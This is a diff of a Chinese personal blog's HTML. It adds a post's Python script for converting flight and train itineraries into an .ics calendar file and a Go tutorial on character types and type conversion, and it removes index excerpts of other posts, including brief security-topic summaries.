class="number">0</span>] <span class="keyword">or</span> <span class="string">&#x27;动车&#x27;</span> <span class="keyword">in</span> info[<span class="number">0</span>]:</span><br><span class="line">            <span class="comment"># 高铁信息</span></span><br><span class="line">            name = info[<span class="number">0</span>]</span><br><span class="line">            <span class="comment"># 起始站</span></span><br><span class="line">            start_station = info[<span class="number">1</span>]</span><br><span class="line">            <span class="comment"># 出发时间</span></span><br><span class="line">            depart_time = info[<span class="number">2</span>]</span><br><span class="line">            depart_time = datetime.datetime.strptime(depart_time, <span class="string">&#x27;%Y/%m/%d %H:%M&#x27;</span>)</span><br><span class="line">            <span class="comment"># 终点站</span></span><br><span class="line">            end_station = info[<span class="number">3</span>]</span><br><span class="line">            <span class="comment"># 到达时间</span></span><br><span class="line">            arrive_time = info[<span class="number">4</span>]</span><br><span class="line">            arrive_time = datetime.datetime.strptime(arrive_time, <span class="string">&#x27;%Y/%m/%d %H:%M&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># 航班信息</span></span><br><span class="line">            flight_info = transport.split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">            name = flight_info[<span class="number">0</span>]</span><br><span class="line">            <span class="comment"># 解析出机场和时间信息</span></span><br><span class="line">            airport = flight_info[<span class="number">1</span>].split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">            depart_airport = <span class="string">&#x27; &#x27;</span>.join(airport[:<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line">            depart_time = flight_info[<span class="number">2</span>]</span><br><span class="line">            depart_time = datetime.datetime.strptime(depart_time, <span class="string">&#x27;%Y-%m-%d %H:%M&#x27;</span>)</span><br><span class="line"></span><br><span class="line">            airport = flight_info[<span class="number">3</span>].split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">            arrive_airport = <span class="string">&#x27; &#x27;</span>.join(airport[:<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line">            arrive_time = flight_info[<span class="number">4</span>]</span><br><span class="line">            arrive_time = datetime.datetime.strptime(arrive_time, <span class="string">&#x27;%Y-%m-%d %H:%M&#x27;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 生成VEVENT事件</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            ics += <span class="string">f&quot;BEGIN:VEVENT\n&quot;</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;高铁&#x27;</span> <span class="keyword">in</span> name <span class="keyword">or</span> <span class="string">&#x27;动车&#x27;</span> <span class="keyword">in</span> name:</span><br><span class="line">                ics += <span class="string">f&quot;UID:<span class="subst">&#123;name&#125;</span>@<span class="subst">&#123;start_station&#125;</span>@<span class="subst">&#123;end_station&#125;</span>\n&quot;</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                ics += <span class="string">f&quot;UID:<span class="subst">&#123;name&#125;</span>@<span class="subst">&#123;depart_airport&#125;</span>@<span class="subst">&#123;arrive_airport&#125;</span>\n&quot;</span></span><br><span class="line">            ics += <span class="string">f&quot;DTSTART;TZID=Asia/Shanghai:<span class="subst">&#123;depart_time.strftime(<span class="string">&#x27;%Y%m%dT%H%M%S&#x27;</span>)&#125;</span>\n&quot;</span></span><br><span class="line">            ics += <span class="string">f&quot;DTEND;TZID=Asia/Shanghai:<span class="subst">&#123;arrive_time.strftime(<span class="string">&#x27;%Y%m%dT%H%M%S&#x27;</span>)&#125;</span>\n&quot;</span></span><br><span class="line">            ics += <span class="string">f&quot;SUMMARY:<span class="subst">&#123;name&#125;</span>\n&quot;</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;高铁&#x27;</span> <span class="keyword">in</span> name <span class="keyword">or</span> <span class="string">&#x27;动车&#x27;</span> <span class="keyword">in</span> name:</span><br><span class="line">                ics += <span class="string">f&quot;LOCATION:<span class="subst">&#123;start_station&#125;</span> -&gt; <span class="subst">&#123;end_station&#125;</span>\n&quot;</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                ics += <span class="string">f&quot;LOCATION:<span class="subst">&#123;depart_airport&#125;</span> -&gt; <span class="subst">&#123;arrive_airport&#125;</span>\n&quot;</span></span><br><span class="line">            ics += <span class="string">&quot;END:VEVENT\n&quot;</span></span><br><span class="line">            event_count += <span class="number">1</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;生成VEVENT失败:<span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">            logging.exception(e)</span><br><span class="line"></span><br><span class="line">ics += <span class="string">&quot;END:VCALENDAR&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果成功生成了至少一个事件,就写入文件</span></span><br><span class="line"><span class="keyword">if</span> event_count &gt; <span class="number">0</span>:</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;result.ics&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(ics)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;没有生成任何事件,无法写入到文件&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>Demo.txt 格式</p>
+<ul>
+<li>航班信息</li>
+</ul>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">厦门航空 MF8415</span><br><span class="line">杭州萧山机场T3</span><br><span class="line">2023-05-04 15:20</span><br><span class="line">重庆江北机场T3</span><br><span class="line">2023-05-04 17:45</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>高铁信息</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">高铁 G158</span><br><span class="line">杭州东站</span><br><span class="line">2023/05/04 16:13</span><br><span class="line">上海虹桥站</span><br><span class="line">2023/05/04 17:12</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h2 id="五-、-最后"><a href="#五-、-最后" class="headerlink" title="五 、 最后"></a>五 、 最后</h2><p>整个过程中因为我不想自己去手动调整代码，直接以命令口吻要求Chatgpt和Claude帮我写，如果报错或者输出结果不对，就把结果和错误发送回去，让它继续优化，直到达到自己想要的目的。 因为本人用的gpt3.5 和 Claude，编码能力不及gpt4.0；所以替我写好的代码需要重复调整，在这个上面花费的时间有点多（当然也有我自己写错配置的原因，比如<strong>到达</strong>写成<strong>达到</strong>，chatgpt第二次给我指正这个问题时候我才发现🤣）</p>
+<p>目前代码需要自己在txt文件中添加航班或者高铁信息，还有优化的空间。</p>
+<h3 id="5-1-一些小问题"><a href="#5-1-一些小问题" class="headerlink" title="5.1 一些小问题"></a>5.1 一些小问题</h3><p>在使用Keepchatgpt插件的时候，chatgpt发过来的代码还是会出现中断的情况，但是不会出现报错提示了。此时就需要提升chatgpt 代码没发完整，需要重新发。</p>
+<p><img src="/../img/%E8%AE%A9Chatgpt%E5%B8%AE%E6%88%91%E5%86%99%E4%BB%A3%E7%A0%81(%E4%B8%80)/image-20230423004643663.png" alt="chatgpt回复出现中断"></p>
+<h3 id="5-2-代码能力："><a href="#5-2-代码能力：" class="headerlink" title="5.2 代码能力："></a>5.2 <strong>代码能力</strong>：</h3><p>gpt 4.0 &gt;&gt; gpt 3.5 &gt; Claude</p>
+<h3 id="5-3-注意-⚠️"><a href="#5-3-注意-⚠️" class="headerlink" title="5.3 注意 ⚠️"></a>5.3 注意 ⚠️</h3><p>本次只是一个小脚本，信息就是个人的出行信息。不涉及敏感信息，但还是要强调一点：不要在chatgpt上发送有关企业内部代码和敏感涉密代码。信息安全是重中之重！！！</p>
+<p>想吐槽携程啥时候能把这个行程信息同步功能重新上线….😶‍🌫️</p>
+<h2 id="六、参考来源"><a href="#六、参考来源" class="headerlink" title="六、参考来源"></a>六、参考来源</h2><ol>
+<li><a target="_blank" rel="noopener" href="https://chat.openai.com/">https://chat.openai.com/</a></li>
+<li><a target="_blank" rel="noopener" href="https://app.slack.com/">https://app.slack.com</a></li>
+</ol>
+
       
     </div>
-  </div>
-</div>
 
-</div>
-
-  </header>
-
-  <main>
-    
-      <div class="container nopadding-x-md">
-        <div id="board"
-          style="margin-top: 0">
-          
-          <div class="container">
-            <div class="row">
-              <div class="col-12 col-md-10 m-auto">
-                
-
-
-  <div class="row mx-auto index-card">
     
     
-    <article class="col-12 col-md-12 mx-auto index-info">
-      <h1 class="index-header">
-        
-        <a href="/2023/04/22/%E8%AE%A9Chatgpt%E5%B8%AE%E6%88%91%E5%86%99%E4%BB%A3%E7%A0%81(%E4%B8%80)/" target="_self">
-          让Chatgpt帮我写代码(一)
-        </a>
-      </h1>
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
 
       
-      <a class="index-excerpt index-excerpt__noimg" href="/2023/04/22/%E8%AE%A9Chatgpt%E5%B8%AE%E6%88%91%E5%86%99%E4%BB%A3%E7%A0%81(%E4%B8%80)/" target="_self">
-        <div>
-          一、起因今天在刷牙的时候看了一眼携程app上订的旅游的航班和高铁班次，发现不知什么时候携程把行程同步到日历的功能给下线了…  但对于我这种习惯了用日历或者提醒功能的人，行程没法通过日历主动提醒，就觉得缺了啥东西。 于是上网搜了搜如何把行程同步到日历上。 后来在知乎上看到了一个人把航班信息发给chatgpt，让它给我直接生成ics文件，然后用mac直接打开就能生成日历了。我也试了下，如下  打开日历
-        </div>
-      </a>
-
-      <div class="index-btm post-metas">
-        
-          <div class="post-meta mr-3">
-            <i class="iconfont icon-date"></i>
-            <time datetime="2023-04-22 22:40" pubdate>
-              2023-04-22
-            </time>
-          </div>
-        
-        
-          <div class="post-meta mr-3 d-flex align-items-center">
-            <i class="iconfont icon-category"></i>
-            
-
-<span class="category-chains">
   
   
-    
-      <span class="category-chain">
-        
-  <a href="/categories/%E6%9D%82%E8%B0%88/" class="category-chain-item">杂谈</a>
-  
-  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://suiyideali.github.io/2023/04/21/Go%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0(%E4%B8%80)/">
 
-      </span>
-    
-  
-</span>
-
-          </div>
-        
-        
-          <div class="post-meta">
-            <i class="iconfont icon-tags"></i>
-            
-              <a href="/tags/chatgpt-LLM/">#chatgpt LLM</a>
-            
-          </div>
-        
-      </div>
-    </article>
-  </div>
-
-  <div class="row mx-auto index-card">
-    
-    
-    <article class="col-12 col-md-12 mx-auto index-info">
-      <h1 class="index-header">
-        
-        <a href="/2023/04/21/Go%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0(%E4%B8%80)/" target="_self">
-          Go语言基础学习(一)
-        </a>
-      </h1>
-
-      
-      <a class="index-excerpt index-excerpt__noimg" href="/2023/04/21/Go%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0(%E4%B8%80)/" target="_self">
-        <div>
-          一 、Go 语言的字符类型字符类型在工作中也会非常频繁地用到，是一个非常重要的数据类型。这里主要介绍 Go 语言中处理字符和字符串的数据类型 1.1 字符和字符串类型   序号 类型 说明    1 byte uint8 类型的别名，同等于 uint8。一般用于表示 ASCII 字符，即只能操作简单的字符，不支持中文操作。   2 rune int32 类型的别名，同等于 int32。一般用于表示
-        </div>
-      </a>
-
-      <div class="index-btm post-metas">
-        
-          <div class="post-meta mr-3">
-            <i class="iconfont icon-date"></i>
-            <time datetime="2023-04-21 16:59" pubdate>
-              2023-04-21
-            </time>
-          </div>
-        
-        
-          <div class="post-meta mr-3 d-flex align-items-center">
-            <i class="iconfont icon-category"></i>
-            
-
-<span class="category-chains">
-  
-  
-    
-      <span class="category-chain">
-        
-  <a href="/categories/code/" class="category-chain-item">code</a>
-  
-  
-
-      </span>
-    
-  
-</span>
-
-          </div>
-        
-        
-          <div class="post-meta">
-            <i class="iconfont icon-tags"></i>
-            
-              <a href="/tags/Go/">#Go</a>
-            
-          </div>
-        
-      </div>
-    </article>
-  </div>
-
-  <div class="row mx-auto index-card">
-    
-    
-    <article class="col-12 col-md-12 mx-auto index-info">
-      <h1 class="index-header">
-        
-        <a href="/2023/04/20/chatgpt%E5%8F%8A%E5%85%B6%E5%A4%A7%E8%AF%AD%E8%A8%80%E6%A8%A1%E5%9E%8B(LLM)%E5%BA%94%E7%94%A8/" target="_self">
-          chatgpt及其大语言模型(LLM)应用
-        </a>
-      </h1>
-
-      
-      <a class="index-excerpt index-excerpt__noimg" href="/2023/04/20/chatgpt%E5%8F%8A%E5%85%B6%E5%A4%A7%E8%AF%AD%E8%A8%80%E6%A8%A1%E5%9E%8B(LLM)%E5%BA%94%E7%94%A8/" target="_self">
-        <div>
-          1. 前言为了顺应时代浪潮（怕被卷没了），开始使用chatgpt这种大语言模型（LLM）应用了，体验了Chatgpt、谷歌Bard、Claude等国外的LLM应用，主要国内也没获取到相关应用到内测资格 hhh 其中Chatgpt 和 Claude 算是目前本人的主力使用，对中文也很友好，而且能解决代码开发中的效率问题，妥妥生产力！ 2. 大语言模型（LLM）什么是大语言模型？  大语言模型（LLM
-        </div>
-      </a>
-
-      <div class="index-btm post-metas">
-        
-          <div class="post-meta mr-3">
-            <i class="iconfont icon-date"></i>
-            <time datetime="2023-04-20 23:38" pubdate>
-              2023-04-20
-            </time>
-          </div>
-        
-        
-          <div class="post-meta mr-3 d-flex align-items-center">
-            <i class="iconfont icon-category"></i>
-            
-
-<span class="category-chains">
-  
-  
-    
-      <span class="category-chain">
-        
-  <a href="/categories/%E6%9D%82%E8%B0%88/" class="category-chain-item">杂谈</a>
-  
-  
-
-      </span>
-    
-  
-</span>
-
-          </div>
-        
-        
-          <div class="post-meta">
-            <i class="iconfont icon-tags"></i>
-            
-              <a href="/tags/chatgpt-LLM/">#chatgpt LLM</a>
-            
-          </div>
-        
-      </div>
-    </article>
-  </div>
-
-  <div class="row mx-auto index-card">
-    
-    
-    <article class="col-12 col-md-12 mx-auto index-info">
-      <h1 class="index-header">
-        
-        <a href="/2023/04/20/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%88%9D%E6%8E%A2/" target="_self">
-          应急响应初探
-        </a>
-      </h1>
-
-      
-      <a class="index-excerpt index-excerpt__noimg" href="/2023/04/20/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%88%9D%E6%8E%A2/" target="_self">
-        <div>
-          常用方法 三要素法：时间、地点、事件 回溯攻击法：尝试模拟攻击 经验法： 攻击者常用的目录 黑客惯用手法 常见恶意程序特征    应急响应阶段检测阶段→抑制阶段→根除阶段→恢复阶段→溯源阶段 应急排查点 Windows登录记录 命令输入: gpedit.msc   “计算机配置”→“Windows设置”→“安全设置”→“本地策略”→“审核策略”，双击其中的“审核帐户登陆事件”&#x3D;&#x3D
-        </div>
-      </a>
-
-      <div class="index-btm post-metas">
-        
-          <div class="post-meta mr-3">
-            <i class="iconfont icon-date"></i>
-            <time datetime="2023-04-20 23:00" pubdate>
-              2023-04-20
-            </time>
-          </div>
-        
-        
-          <div class="post-meta mr-3 d-flex align-items-center">
-            <i class="iconfont icon-category"></i>
-            
-
-<span class="category-chains">
-  
-  
-    
-      <span class="category-chain">
-        
-  <a href="/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/" class="category-chain-item">应急响应</a>
-  
-  
-
-      </span>
-    
-  
-</span>
-
-          </div>
-        
-        
-          <div class="post-meta">
-            <i class="iconfont icon-tags"></i>
-            
-              <a href="/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/">#应急响应</a>
-            
-          </div>
-        
-      </div>
-    </article>
-  </div>
-
-  <div class="row mx-auto index-card">
-    
-    
-    <article class="col-12 col-md-12 mx-auto index-info">
-      <h1 class="index-header">
-        
-        <a href="/2023/04/20/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/" target="_self">
-          Redis未授权访问初探
-        </a>
-      </h1>
-
-      
-      <a class="index-excerpt index-excerpt__noimg" href="/2023/04/20/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/" target="_self">
-        <div>
-          一、简介和危害1. 什么是redis未授权访问漏洞Redis 默认情况下，会绑定在 0.0.0.0:6379，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis 服务暴露到公网上，如果在没有设置密码认证（一般为空）的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redi
-        </div>
-      </a>
-
-      <div class="index-btm post-metas">
-        
-          <div class="post-meta mr-3">
-            <i class="iconfont icon-date"></i>
-            <time datetime="2023-04-20 21:40" pubdate>
-              2023-04-20
-            </time>
-          </div>
-        
-        
-          <div class="post-meta mr-3 d-flex align-items-center">
-            <i class="iconfont icon-category"></i>
-            
-
-<span class="category-chains">
-  
-  
-    
-      <span class="category-chain">
-        
-  <a href="/categories/web%E5%AE%89%E5%85%A8/" class="category-chain-item">web安全</a>
-  
-  
-
-      </span>
-    
-  
-</span>
-
-          </div>
-        
-        
-          <div class="post-meta">
-            <i class="iconfont icon-tags"></i>
-            
-              <a href="/tags/redis/">#redis</a>
-            
-          </div>
-        
-      </div>
-    </article>
-  </div>
-
-  <div class="row mx-auto index-card">
-    
-    
-    <article class="col-12 col-md-12 mx-auto index-info">
-      <h1 class="index-header">
-        
-        <a href="/2023/04/20/%E5%BC%80%E7%AB%AF/" target="_self">
-          开端
-        </a>
-      </h1>
-
-      
-      <a class="index-excerpt index-excerpt__noimg" href="/2023/04/20/%E5%BC%80%E7%AB%AF/" target="_self">
-        <div>
-          Hello blog很早之前就想搭建一个博客，写一点东西，后续博客更新内容如下：  网络安全 渗透测试 甲方安全 代码 杂谈 日常生活  后续随缘更新…..
-        </div>
-      </a>
-
-      <div class="index-btm post-metas">
-        
-          <div class="post-meta mr-3">
-            <i class="iconfont icon-date"></i>
-            <time datetime="2023-04-20 17:12" pubdate>
-              2023-04-20
-            </time>
-          </div>
-        
-        
-        
-          <div class="post-meta">
-            <i class="iconfont icon-tags"></i>
-            
-              <a href="/tags/%E6%9D%82%E8%B0%88/">#杂谈</a>
-            
-          </div>
-        
-      </div>
-    </article>
-  </div>
-
-
-
-  <nav aria-label="navigation">
-    <span class="pagination" id="pagination">
-      <a class="extend prev" rel="prev" href="/page/3/#board"><i class="iconfont icon-arrowleft"></i></a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/#board">2</a><a class="page-number" href="/page/3/#board">3</a><span class="page-number current">4</span>
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="m0ch4z">
+      <meta itemprop="description" content="">
     </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Geek小黑板">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/04/21/Go%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0(%E4%B8%80)/" class="post-title-link" itemprop="url">Go语言基础学习(一)</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2023-04-21 16:59:43" itemprop="dateCreated datePublished" datetime="2023-04-21T16:59:43+08:00">2023-04-21</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-05-22 12:07:31" itemprop="dateModified" datetime="2023-05-22T12:07:31+08:00">2023-05-22</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/code/" itemprop="url" rel="index"><span itemprop="name">code</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="一-、Go-语言的字符类型"><a href="#一-、Go-语言的字符类型" class="headerlink" title="一 、Go 语言的字符类型"></a>一 、Go 语言的字符类型</h2><p>字符类型在工作中也会非常频繁地用到，是一个非常重要的数据类型。这里主要介绍 Go 语言中处理<strong>字符和字符串</strong>的数据类型</p>
+<h3 id="1-1-字符和字符串类型"><a href="#1-1-字符和字符串类型" class="headerlink" title="1.1 字符和字符串类型"></a>1.1 字符和字符串类型</h3><table>
+<thead>
+<tr>
+<th align="left">序号</th>
+<th align="left">类型</th>
+<th align="left">说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">1</td>
+<td align="left">byte</td>
+<td align="left"><strong>uint8</strong> 类型的别名，同等于 <strong>uint8</strong>。一般用于表示 <strong>ASCII</strong> 字符，即只能操作简单的字符，<strong>不支持中文操作</strong>。</td>
+</tr>
+<tr>
+<td align="left">2</td>
+<td align="left">rune</td>
+<td align="left"><strong>int32</strong> 类型的别名，同等于 <strong>int32</strong>。一般用于表示 <strong>Unicode</strong> 字符，即可以处理<strong>任何字符</strong>。</td>
+</tr>
+<tr>
+<td align="left">3</td>
+<td align="left">string</td>
+<td align="left">一个指向 byte 数组的指针，可以为<strong>空字符串</strong>不可为<strong>nil</strong>。</td>
+</tr>
+</tbody></table>
+<h3 id="1-2-代码示例"><a href="#1-2-代码示例" class="headerlink" title="1.2 代码示例"></a>1.2 代码示例</h3><p>使用一段代码来更清晰地解释<code>byte</code>和<code>rune</code>的区别，以及了解这三个类型的关系。</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 将字符串转化为rune的数组，并替换数组第i个元素为ch</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">str2Rune</span><span class="params">(str *<span class="type">string</span>, i <span class="type">int</span>, ch <span class="type">rune</span>)</span></span> &#123;</span><br><span class="line">	temp := []<span class="type">rune</span>(*str)</span><br><span class="line">	temp[i] = ch</span><br><span class="line">	*str = <span class="type">string</span>(temp)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将字符串转换为byte的数组，并替换数组第i个元素为ch</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">str2Byte</span><span class="params">(str *<span class="type">string</span>, i <span class="type">int</span>, ch <span class="type">byte</span>)</span></span> &#123;</span><br><span class="line">	temp := []<span class="type">byte</span>(*str)</span><br><span class="line">	temp[i] = ch</span><br><span class="line">	*str = <span class="type">string</span>(temp)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	str := <span class="string">&quot;你好 Hello&quot;</span></span><br><span class="line">	str1 := <span class="string">&quot;你好 Hello&quot;</span></span><br><span class="line">	str2 := <span class="string">&quot;你好 Hello&quot;</span></span><br><span class="line">	str2Rune(&amp;str, <span class="number">1</span>, <span class="string">&#x27;A&#x27;</span>)  <span class="comment">//将第1个字符替换为A</span></span><br><span class="line">	str2Byte(&amp;str1, <span class="number">3</span>, <span class="string">&#x27;A&#x27;</span>) <span class="comment">//将第3个字符替换为A</span></span><br><span class="line">	str2Byte(&amp;str2, <span class="number">7</span>, <span class="string">&#x27;A&#x27;</span>) <span class="comment">// 将第7个字符替换为A</span></span><br><span class="line">	fmt.Println(<span class="string">&quot;rune 数组处理中文后: &quot;</span>, str)</span><br><span class="line">	fmt.Println(<span class="string">&quot;byte 数组处理中文后: &quot;</span>, str1)</span><br><span class="line">	fmt.Println(<span class="string">&quot;byte 数组处理中文后: &quot;</span>, str2)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>输出结果如下：</p>
+<p><img src="/../img/Go%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0(%E4%B8%80)/image-20230421171217768.png" alt="byte 和 rune 区别实例输出结果"></p>
+<hr>
+<p><strong>结论</strong></p>
+<ul>
+<li><code>string</code>可以直接转换为<code>rune</code>或者<code>byte</code>的<strong>数组；</strong></li>
+<li><code>rune</code>和<code>byte</code>可以互相转换；</li>
+<li><code>byte</code> 的操作单位是一个<strong>字节</strong>，可以理解为一个英文字符；</li>
+<li><code>rune</code> 的操作单位是一个<strong>字符</strong>，不管这个字符是什么字符。</li>
+</ul>
+<h2 id="二、-Go-语言的强制类型转换"><a href="#二、-Go-语言的强制类型转换" class="headerlink" title="二、 Go 语言的强制类型转换"></a>二、 Go 语言的强制类型转换</h2><p>Go 语言是一种强类型语言，而且没有<strong>隐式转换</strong>。也就是说运算符左右的<strong>变量类型必须一致</strong>，若不一致就会报错。为了使用户更加的容易使用，所以 Go 语言提供了各个类型之间强制类型转换的内置方法。</p>
+<h3 id="2-1-整型和浮点型互相转换"><a href="#2-1-整型和浮点型互相转换" class="headerlink" title="2.1 整型和浮点型互相转换"></a>2.1 整型和浮点型互相转换</h3><p><strong>整型</strong>和<strong>浮点型</strong>变量之间的相互转换相对容易，只需使用强制类型转换标志 <code>type(variable)</code>就好了。需要注意的是，当<strong>高精度</strong>向<strong>低精度</strong>类型转换的时候，会<strong>失真</strong>。即浮点型向整型转换的时候会失去其小数部分。需要<strong>避免这两个类型的互相转换</strong>。</p>
+<p>但是也有无法避免的场景，比如说计算浮点数和整数的和之类的情况中。就要秉持<strong>不失真原则</strong>，将低精度向高精度转换之后进行计算。</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="keyword">var</span> a <span class="type">int</span> = <span class="number">10</span>       <span class="comment">// 声明一个整型变量a 并给 a 赋值为10</span></span><br><span class="line">	<span class="keyword">var</span> b <span class="type">float32</span> = <span class="number">3.14</span> <span class="comment">// 声明一个浮点型变量b 并给 b 赋值为3.14</span></span><br><span class="line"></span><br><span class="line">	fmt.Println(<span class="string">&quot;整型转换为浮点型: %f\n&quot;</span>, <span class="type">float32</span>(a)) <span class="comment">// 将变量 a 强制转换为浮点型变量并打印</span></span><br><span class="line">	fmt.Println(<span class="string">&quot;浮点型转换为整型: %d\n&quot;</span>, <span class="type">int</span>(b))     <span class="comment">// 浮点型转为整型会失真</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>最终输出结果为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">整型转换为浮点型: %f</span><br><span class="line"> 10</span><br><span class="line">浮点型转换为整型: %d</span><br><span class="line"> 3</span><br></pre></td></tr></table></figure>
+
+<p>可以发现浮点型转为整型时候，3.14 失真了，结果为 3。</p>
+<h3 id="2-2-整形和字符串互相转换"><a href="#2-2-整形和字符串互相转换" class="headerlink" title="2.2 整形和字符串互相转换"></a>2.2 整形和字符串互相转换</h3><p>整型和字符串类型的变量互相转换，需要依靠 Go 语言提供的转换包<code>strconv</code>。字符串转整型需要使用这个包的<code>Atoi(string)</code>方法，整型转字符串则是<code>Itoa(int)</code>。这种转换用得最多的就是给一些对象进行<strong>编号</strong>。比如需要给张三编号为NO.1，你可能需要将1转换为字符串之后与NO.进行拼接。</p>
